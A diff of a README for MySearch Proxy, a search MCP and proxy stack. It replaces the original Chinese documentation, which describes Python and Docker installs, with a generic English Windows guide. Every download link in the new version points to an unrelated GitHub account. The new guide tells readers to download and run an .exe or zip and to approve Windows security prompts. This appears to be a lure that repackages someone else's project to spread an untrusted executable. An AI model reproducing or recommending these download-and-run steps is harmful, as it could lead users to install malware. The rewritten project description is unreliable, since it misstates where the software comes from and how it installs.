@@ -1,332 +1,190 @@
-# MySearch Proxy
+# 🔎 MySearch-Proxy - Unified Search for Every Workflow
 
-[English Guide](./README_EN.md)
+[![Download MySearch-Proxy](https://img.shields.io/badge/Download-MySearch--Proxy-blue?style=for-the-badge&logo=github)](https://github.com/constanceintrauterine625/MySearch-Proxy)
 
-`MySearch Proxy` 是一套给 AI 助手准备的统一搜索栈。
+## 🧭 What this is
 
-它把原本分散的 4 件事收成了同一个仓库：
+MySearch-Proxy brings search tools into one place. It connects Tavily, Firecrawl, and Social / X search through one simple app.
 
-- `mysearch/`
-  - 真正可安装的 MySearch MCP
-- `skill/`
-  - 给 Codex / Claude Code 的 skill 与安装说明
-- `openclaw/`
-  - 给 OpenClaw / ClawHub 的独立 skill bundle
-- `proxy/`
-  - 给团队或公开部署使用的控制台与代理层
+Use it when you want to:
 
-支持的搜索能力：
+- search across web and social sources from one screen
+- run an MCP-based search tool with less setup
+- use a proxy console for search requests
+- keep your search tools in one workflow
 
-- Tavily
-- Firecrawl
-- Exa
-- 可选 X / Social
-
-目标很简单：
-
-- 让本地 AI 助手先用起来
-- 让 OpenClaw 直接装上去
-- 让团队共享一套统一搜索后端
-- 让调用方尽量少关心底层 provider 差异
-
-项目入口：
-
-- GitHub：
-  [skernelx/MySearch-Proxy](https://github.com/skernelx/MySearch-Proxy)
-- Docker Hub：
-  [skernelx/mysearch-proxy](https://hub.docker.com/r/skernelx/mysearch-proxy)
-- ClawHub：
-  [clawhub.ai/skernelx/mysearch](https://clawhub.ai/skernelx/mysearch)
-
-![MySearch Console Hero](./docs/images/mysearch-console-hero.jpg)
-
-## 为什么做这个项目
-
-很多搜索类项目只解决其中一小段：
-
-- 只给一个 `web_search`
-- 只会搜，不会抓正文
-- 只会调官方 API，不方便接自建网关
-- 只给 prompt，不给真正能安装的运行时
-- 只做 key 面板，不解决 AI 如何调用
-
-`MySearch Proxy` 选择直接把整条链补齐：
-
-```text
-上游 provider / 聚合网关
-  -> Tavily / Firecrawl / Exa / X / Social
-
-MySearch Proxy
-  -> 控制台、Token、额度同步、兼容代理接口
-
-MySearch MCP / Codex Skill / OpenClaw Skill
-  -> 给 Codex、Claude Code、OpenClaw、其他 Agent 直接使用
-```
-
-## 推荐架构
-
-当前最推荐的是 `proxy-first`：
-
-```text
-上游 provider
-  -> MySearch Proxy
-     -> 生成 MySearch 通用 token
-        -> MySearch MCP / OpenClaw skill / 其他 Agent
-```
-
-这条路的好处很直接：
-
-- 客户端只需要一组 `MYSEARCH_PROXY_*`
-- Tavily / Firecrawl / Exa 不再散落到每台机器
-- 可以统一管理 token、调用统计和额度同步
-- OpenClaw、本地 Codex、团队代理都能复用同一套配置
-
-如果你暂时还没有 Proxy，也可以让 `mysearch/` 或 `openclaw/` 直接连官方
-provider。
-
-## 最新优化（v0.1.11）
+## 🪟 What you need on Windows
 
-这次版本重点是把 provider 健康状态从“只看有没有 key”升级成“能看出 key 是不是活着”，并把 docs / resource 路由对失效 provider 的自保补齐；上一版 `config-first`、Python 3.10 兼容和 Firecrawl 域名过滤回退继续保留。
-
-- 配置入口收口：
-  - `MySearch` runtime 现在会优先读取 `~/.codex/config.toml` 的 `mcp_servers.mysearch.env`。
-  - `install.sh` 会先继承宿主已注册的 `MYSEARCH_*`，再用 `mysearch/.env` 只补缺省值。
-  - OpenClaw wrapper 现在会优先读取 `openclaw.json` 的 `skills.entries.mysearch.env`。
-  - `.env` 继续支持，但明确只保留给本地单仓调试兜底，不再是推荐主路径。
-  - 读取宿主 config 时不再强依赖 Python 3.11 的 `tomllib`，对 Python 3.10 会自动回退到轻量解析。
+Before you start, make sure you have:
 
-- 文档 / 资源类结果重排：
-  - `docs / github / pdf / resource / tutorial` 的 blended 结果现在会优先官方域名和官方文档路径。
-  - 显式传了 `include_domains` 时，会进一步把命中域名的结果稳定放到前面。
-  - `reddit / arxiv / researchgate / medium / youtube` 这类明显第三方页面不再轻易抢前几条。
-  - `citations` 会跟随重排后的结果顺序，避免前排已经修正但引用顺序还是旧的。
-  - Firecrawl 如果在 `site:domain query` 这一跳返回空结果，会自动做一轮无 `site:` 的 Firecrawl 检索，再在客户端按域名过滤，优先把结果留在 Firecrawl 链路里，而不是立刻退回 Tavily。
-
-- Provider 健康检查与路由自保：
-  - `health` 现在除了 `available_keys`，还会返回每个 provider 的 `live_status`、`live_error`、`last_checked_at`。
-  - 例如 `Tavily key 已失效 / 被停用`，现在会明确显示成 `auth_error`，而不是只看起来像“有 key 可用”。
-  - docs / resource / balanced 路由会跳过 `auth_error` 的 provider，不再把失效的 Tavily 当成发现阶段主路由。
-  - Firecrawl 的域名 fallback 也会跳过 `auth_error` 的 Tavily，避免本来已经切开主路由，最后又在 fallback 阶段被 401 绊倒。
-
-- 路由与参数稳定性：
-  - MCP 入口现在兼容单字符串形式的 `sources`、`include_domains`、`formats` 等参数。
-  - 显式指定 `provider` 时，不会再被 `balanced` 策略偷偷混成 `hybrid`。
-- 抓取质量修复：
-  - `extract_url(auto)` 现在会识别更多假正文，并按需回退。
-  - 已覆盖 `linux.do` anti-bot 提示、验证码挑战页、GitHub blob 页面壳等场景。
-  - GitHub 公开仓库 `blob` 页面在 `auto` 模式下会优先改写到 raw 地址直接抓正文。
-- 社交结果一致性：
-  - 日期过滤后如果没有命中，`results / citations / answer` 会保持一致，不再残留旧内容。
-- Social / X fallback：
-  - `social/search` 现在支持主模型结果过少或上游报错时自动 fallback。
-  - 返回里新增 `route` 元信息，能直接看到实际选中的模型、fallback 是否触发，以及每轮尝试结果数。
-  - 推荐线上配置改为：主模型 `grok-3-mini`，fallback `grok-4.1-fast`，阈值 `3`。
-
-- 并行执行优化：
-  - `search` 的混合分支和 `research` 工作流支持并行请求，减少长尾等待。
-- 内存缓存：
-  - 为 `search` 和 `extract` 增加 TTL 缓存，重复查询会显著更快。
-- 调试可见性：
-  - `search` 返回新增 `route_debug`，明确路由决策和是否命中缓存。
-  - `search` / `extract` 返回新增 `cache` 字段，直接看到 `hit` 与 `ttl_seconds`。
-- 健康检查增强：
-  - `mysearch_health` / `health` 现在会返回 `runtime`、`routing_defaults`、`cache`。
-- OpenClaw 同步：
-  - `openclaw` bundle 将随本次发布同步到 `mysearch@0.1.11`。
+- Windows 10 or Windows 11
+- a stable internet connection
+- about 200 MB of free disk space
+- permission to run downloaded apps on your PC
 
-新增运行时参数：
-
-```env
-MYSEARCH_MAX_PARALLEL_WORKERS=4
-MYSEARCH_SEARCH_CACHE_TTL_SECONDS=30
-MYSEARCH_EXTRACT_CACHE_TTL_SECONDS=300
-```
+If Windows asks for approval, choose to allow the app to run.
 
-说明：
+## ⬇️ Download and install
 
-- 终端里单次 CLI 调用通常是新进程，内存缓存不会跨进程复用。
-- 常驻服务模式下缓存才会持续生效。
+Visit this page to download MySearch-Proxy:
 
-## 从哪里开始
+https://github.com/constanceintrauterine625/MySearch-Proxy
 
-按你的使用场景直接走：
+Use the page to get the latest version for Windows, then save the file to your computer.
 
-- 只想让本机 Codex / Claude Code 先用起来：
-  看 [mysearch/README.md](./mysearch/README.md)
-- 想让 AI 自动理解怎么安装和使用：
-  看 [skill/README.md](./skill/README.md)
-- 想给 OpenClaw / ClawHub 安装独立搜索 skill：
-  看 [openclaw/README.md](./openclaw/README.md)
-- 想部署控制台、管理 key / token / 额度：
-  看 [proxy/README.md](./proxy/README.md)
+If the download gives you a `.zip` file:
 
-## 5 分钟快速开始
+1. Open the file after it finishes downloading
+2. Extract it to a folder you can find again, like `Downloads` or `Desktop`
+3. Open the extracted folder
+4. Look for the main app file and run it
 
-### 路线 A：本机直接安装 MySearch MCP
+If the download gives you an `.exe` file:
 
-```bash
-cd /path/to/MySearch-Proxy
-python3 -m venv venv
-```
+1. Double-click the file
+2. If Windows shows a security prompt, choose Run
+3. Wait for the app to open
 
-优先把配置直接放进宿主 config：
+## 🚦 First launch
 
-- `Codex`：`~/.codex/config.toml` 的 `mcp_servers.mysearch.env`
-- `OpenClaw`：`openclaw.json` 的 `skills.entries.mysearch.env`
-- `.env`：只建议本地单仓调试时作为兜底
+When you open MySearch-Proxy for the first time:
 
-推荐最小配置：
+1. Let Windows finish any setup prompts
+2. Wait for the app window to appear
+3. Check that the main console opens without errors
+4. Keep the app open while you use search tools
 
-```env
-MYSEARCH_PROXY_BASE_URL=https://your-mysearch-proxy.example.com
-MYSEARCH_PROXY_API_KEY=mysp-...
-```
+If the app uses a local window or tray icon, it may start in the background and then open its console.
 
-安装：
+## 🔑 Set up your search tools
 
-```bash
-./install.sh
-```
+MySearch-Proxy works with search services such as Tavily, Firecrawl, and Social / X. To use them, add the keys or login details your setup needs.
 
-`install.sh` 现在会优先继承宿主已有配置，再用 `mysearch/.env` 只补缺省值。
+Typical setup steps:
 
-验收：
+1. Open the settings or config area
+2. Add your Tavily access key
+3. Add your Firecrawl access key
+4. Set up Social / X access if your workflow needs it
+5. Save your changes
 
-```bash
-python3 skill/scripts/check_mysearch.py --health-only
-python3 skill/scripts/check_mysearch.py --web-query "OpenAI latest announcements"
-```
+If the app gives you a config file, open it with Notepad and enter the details there. Save the file, then restart the app.
 
-### 路线 B：先部署 Proxy，再让所有客户端复用
+## 🖥️ Use the proxy console
 
-```bash
-mkdir -p mysearch-proxy-data
+The proxy console is the main place to run search requests.
 
-docker run -d \
-  --name mysearch-proxy \
-  --restart unless-stopped \
-  -p 9874:9874 \
-  -e ADMIN_PASSWORD=change-me \
-  -v $(pwd)/mysearch-proxy-data:/app/data \
-  skernelx/mysearch-proxy:latest
-```
+You can use it to:
 
-部署后：
+- send a search query
+- choose a source
+- view results in one place
+- switch between web and social search
+- test your setup before using it in another tool
 
-1. 登录控制台
-2. 添加 Tavily / Firecrawl / Exa / Social 上游配置
-3. 创建 MySearch 通用 token
-4. 把这个 token 填给 `mysearch/.env` 或 OpenClaw skill env
+A simple workflow looks like this:
 
-## 目录说明
+1. Open MySearch-Proxy
+2. Enter a search term
+3. Pick the search source
+4. Run the search
+5. Review the results in the console
 
-### `mysearch/`
+## 🧩 Use with MCP tools
 
-真正可运行的 MCP 服务。
+MySearch-Proxy supports Model Context Protocol workflows. That means other compatible apps can connect to it and use its search features.
 
-提供 4 个工具：
+Use this setup if you want:
 
-- `search`
-- `extract_url`
-- `research`
-- `mysearch_health`
+- one search layer for multiple tools
+- cleaner access to Tavily and Firecrawl
+- a shared search proxy for assistant apps
+- search results from web and social sources
 
-支持：
+If you connect it to another app, make sure both apps use the same local settings and port values.
 
-- `stdio`
-- `streamableHTTP`
-- `sse`
+## 🔍 Search sources
 
-详细说明见：
-[mysearch/README.md](./mysearch/README.md)
+MySearch-Proxy is built for a mixed search workflow.
 
-### `skill/`
+### 🌐 Tavily
 
-这层不是 MCP 实现，而是给 AI 助手看的安装与使用说明。
+Use Tavily for web search and answer lookup. It helps when you need current pages, facts, or source links.
 
-适合：
+### 🧱 Firecrawl
 
-- Codex 自动安装
-- Claude Code 按 README + SKILL 完成接线
+Use Firecrawl when you need page reading, structured content, or site extraction.
 
-详细说明见：
-[skill/README.md](./skill/README.md)
+### 📣 Social / X
 
-### `openclaw/`
+Use Social / X search for posts, reactions, and short-form updates from public social content.
 
-这是单独打包的 OpenClaw skill bundle。
+## 🛠️ Common Windows setup path
 
-特点：
+If you are not sure what to click, use this path:
 
-- 自带 runtime
-- 可本地安装
-- 可发布到 ClawHub
-- 推荐通过 skill env 注入 `MYSEARCH_PROXY_*`
+1. Download the file from the GitHub page
+2. Open File Explorer
+3. Go to your Downloads folder
+4. Find the MySearch-Proxy file
+5. Double-click it
+6. If it is a zip file, extract it first
+7. If Windows asks for access, approve it
+8. Wait for the app to open
 
-详细说明见：
-[openclaw/README.md](./openclaw/README.md)
+## ⚙️ Basic use cases
 
-### `proxy/`
+MySearch-Proxy fits these common tasks:
 
-这是整套系统的控制台与代理层。
+- look up a topic across web and social sources
+- test search prompts before using them in another app
+- send search requests through one proxy layer
+- keep search tools in one place instead of opening many sites
+- run an MCP search setup on Windows with less manual work
 
-负责：
+## 🧪 If something does not work
 
-- Provider key 池
-- MySearch token 池
-- 调用统计
-- 官方额度同步
-- `/social/search` 兼容入口
+If the app does not start, try this:
 
-详细说明见：
-[proxy/README.md](./proxy/README.md)
+1. Close the app
+2. Open it again as the same user
+3. Check your internet connection
+4. Confirm your API keys or login details are set
+5. Restart Windows if the app still does not open
 
-## 路由策略
+If search results do not appear:
 
-MySearch 默认不是“所有问题都塞给一个 provider”。
+1. Check the selected source
+2. Make sure the key for that service is valid
+3. Try a short search term
+4. Restart the app and test again
 
-当前推荐理解方式：
+## 📁 Suggested folder layout
 
-- `web / news`
-  - 优先 Tavily
-- `docs / github / pdf / pricing / changelog`
-  - 优先 Firecrawl
-- 普通网页补充发现
-  - 可回退 Exa
-- `social`
-  - 走 xAI 或兼容 `/social/search`
-- `extract_url`
-  - 优先 Firecrawl，失败或正文为空时回退 Tavily extract
-- `research`
-  - 先搜索，再抓取正文，再可选补 Social / X
+If you want to keep things tidy, use this setup:
 
-## 适合哪些场景
+- `Downloads` for the first download
+- `MySearch-Proxy` for the extracted app files
+- `MySearch-Proxy\config` for settings files
+- `MySearch-Proxy\logs` for logs if the app creates them
 
-- 本地开发助手的默认搜索入口
-- OpenClaw 的默认搜索 skill
-- 多个 Agent 共用的一套统一搜索后端
-- 你已经有 Tavily / Firecrawl / xAI 上游，想统一收口
+## 🔐 Keep your access keys safe
 
-## 文档地图
+Your search services may use private keys. Store them in a safe place and do not share them.
 
-- 总体架构：
-  [docs/mysearch-architecture.md](./docs/mysearch-architecture.md)
-- MCP：
-  [mysearch/README.md](./mysearch/README.md)
-- OpenClaw：
-  [openclaw/README.md](./openclaw/README.md)
-- Proxy：
-  [proxy/README.md](./proxy/README.md)
-- Codex / Claude Code skill：
-  [skill/README.md](./skill/README.md)
+Good habits:
 
-## 当前公开页面
+- keep keys in a private config file
+- do not post them in chat or public issues
+- use one key set per service
+- replace keys if you think they were exposed
 
-- Docker Hub：
-  [skernelx/mysearch-proxy](https://hub.docker.com/r/skernelx/mysearch-proxy)
-- ClawHub：
-  [clawhub.ai/skernelx/mysearch](https://clawhub.ai/skernelx/mysearch)
+## 🧾 What you can expect
 
-下图是公开页面的历史截图，实时状态请以线上页面为准：
+MySearch-Proxy gives you a single place to manage search tasks across web, crawl, and social sources. It is built for people who want a cleaner search workflow on Windows and do not want to juggle separate tools for each source
 
-![MySearch Skill Security Scan](./docs/images/mysearch-skill-security-scan.jpg)
+## 📌 Project info
+
+- Repository: MySearch-Proxy
+- Description: Unified search MCP, proxy console, and skill for Tavily, Firecrawl, and Social / X
+- Topics: ai-search, claude-code, codex, firecrawl, mcp, model-context-protocol, openclaw, search, search-proxy, social-search, tavily, xai
